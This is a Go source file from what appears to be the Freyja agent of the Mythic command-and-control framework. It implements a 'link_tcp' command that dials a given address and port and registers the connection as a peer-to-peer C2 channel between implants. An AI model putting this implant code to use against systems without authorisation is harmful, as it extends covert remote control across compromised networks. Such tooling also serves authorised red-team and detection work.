package link_tcp

import (
	// Standard

	"encoding/json"
	"fmt"
	"net"

	// Freyja

	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/pkg/utils/structs"
)

type Arguments struct {
	Port    int    `json:"port"`
	Address string `json:"address"`
}

// Run - package function to run link_tcp
func Run(task structs.Task) {
	msg := task.NewResponse()
	args := &Arguments{}
	err := json.Unmarshal([]byte(task.Params), args)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	connectionString := fmt.Sprintf("%s:%d", args.Address, args.Port)
	conn, err := net.Dial("tcp", connectionString)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	task.Job.AddInternalConnectionChannel <- structs.AddInternalConnectionMessage{
		C2ProfileName: "freyja_tcp",
		Connection:    &conn,
	}
	msg.UserOutput = "Successfully Connected"
	msg.Completed = true
	msg.Status = "completed"
	task.Job.SendResponses <- msg

	return
}
